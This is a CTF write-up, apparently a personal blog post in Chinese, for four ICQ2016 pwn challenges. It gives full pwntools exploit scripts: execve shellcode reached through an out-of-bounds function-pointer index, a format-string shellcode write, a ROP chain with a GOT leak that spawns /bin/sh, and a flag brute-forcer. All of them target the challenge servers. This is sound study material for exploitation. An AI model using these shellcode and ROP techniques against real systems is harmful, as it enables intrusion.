---
title: '【ICQ2016】 writeup'
date: 2016-07-05 15:28:40
tags:
 - pwn
 - writeup
---

### pwn1

func函数数组指针的索引没有规定范围，可以越界。

exp如下

``` python
from pwn import *

context(log_level="debug")

addr  =0x0804A030
bbs  = 0x0804A0A0
offset  = (bbs - addr)/4+1
# p  =process('./tc1')
p = remote('106.75.9.11',20000)
# gdb.attach(p,'b*0x8048641\nc')
shellcode = p32(bbs+4)+ '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
p.recvuntil('de\n')
p.sendline(str(offset))
p.recvuntil(' 110]\n')
p.sendline(shellcode)
p.interactive()
```

### pwn2

经典的fmt漏洞。fmt一发，天下我有。

``` python
from pwn import *

context(log_level ="debug")
buf = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
bss = 0x080EBF80

# p = process("./echo-200")
p = remote('106.75.9.11',20001)

got_addr =0x80EB00C
shellcode = buf
shellcode_addr = bss
ret_offset = 0xffc56dbc - 0xffc56bac

def write(addr,data):
	p.recvuntil("Reading 16 bytes\n")
	p.sendline(p32(addr)+"%%%dc" %(ord(data)-4) +"%7$hhn")

i = 0
while i < len(shellcode):
	write(shellcode_addr+i,shellcode[i])
	i +=1


p.recvuntil('Reading 16 bytes\n')
p.sendline('%5$X...')
stack_addr = int(p.recvuntil('...')[:8],16)
ret_addr = stack_addr + ret_offset

i = 0
while i < len(p32(shellcode_addr)):
	write(ret_addr+i,p32(shellcode_addr)[i])
	i +=1
# gdb.attach(p,"b*0x08048FB6\nc")
write(stack_addr-1,'\x01')

p.interactive()

#flag{b3a0b33-645f-49f0-8e30-2d7c31ecfabb}
```

### pwn3

看着这熟悉的bin文件，我蛋都疼了。。这不是蒸米的么。。就改了字符串。。真心蛋疼。。

``` python
# -*-coding=utf8-*-
from pwn import *
# context(log_level="debug")
elf = ELF('qwb3')
write_plt = elf.symbols["write"]
read_plt  = elf.symbols["read"]
write_got = elf.got["write"]
read_got =elf.got["read"]
rop_addr  = 0x40062A
system_got =0x601010
main = 0x40059d
# gdb.attach(p,"b*0x40059C\nc")
# p = process('./qwb3')
p = remote('106.75.8.230',19286)
# p = remote('127.0.0.1',10001)
p.recvuntil('\n')
bss = 0x601038
def leak(addr):
	payload = '\x00'*(0x40)+p64(0)+p64(rop_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(addr)+p64(1)+p64(0x400610)+7*8*'\x00'+p64(main)
	p.send(payload)
	sleep(1)
	data =  p.recv(8)
	p.recvuntil('\n')
	print "%#x => %s" % (addr, (data or '').encode('hex'))
	return data
# d = DynELF(leak, elf=ELF('./qwb3'))
# system_addr = d.lookup('execve', 'libc')
# print hex(u64(leak(write_got)))
system_addr = u64(leak(write_got)) - (0x7f7d4bb06510- 0x7f7d4bad7da0)
# system_addr = u64(leak(write_got)) - (0x7fac9451d4d0- 0x7fac944f1040)
print "system_addr=" + hex(system_addr)
### send '/bin/sh'
# gdb.attach(p,"b*0x40059C\nc")
payload2 = '\x00'*(0x40)+p64(0)+p64(rop_addr)+p64(0)+p64(1)+p64(read_got)+p64(16)+p64(bss)+p64(0)+p64(0x400610)+7*8*'\x00'+p64(main)
p.send(payload2)
sleep(1)
p.send('/bin/sh\0'+p64(system_addr))

p.recvuntil('\n')
###  call system

payload4 = '\x00'*(0x40)+p64(0)+p64(rop_addr)+p64(0)+p64(1)+p64(bss+8)+p64(0)+p64(0)+p64(bss)+p64(0x400610)+7*8*'\x00'+p64(main)
p.send(payload4)
p.interactive()

###ps：发包一定要在一个包里发完。。不然。。。
```

### pwn4

本来期待着pwn4是一个堆的利用，结果是爆破。。爆破。。竟然是爆破。。这特么能作pwn4？

``` python
from pwn import *
import string
# context(log_level ="debug")
printable = string.uppercase+string.lowercase+string.octdigits+string.punctuation
def getflag(flag):
	sleep(0.1)
	# p = process('./cg_leak')
	p = remote('106.75.8.230',13349)
	p.recvuntil('OUR NAME:')
	p.sendline('admin')
	p.recvuntil("'s your name again?\n")
	p.sendline('admin')
	p.recvuntil('FLAG: ')
	p.sendline(flag)
	data = p.recvuntil('\n')
	p.close()
	if data == 'Try submit then!\n':
		return True
	else:
		return False
flag = ''
i = 0
while i<40:
	for x in printable:
	 if getflag(flag+x):
	 	flag+=x
	 	print flag
	i+=1
print flag

#FLAG{wh4t3v3r_1s_0k}
```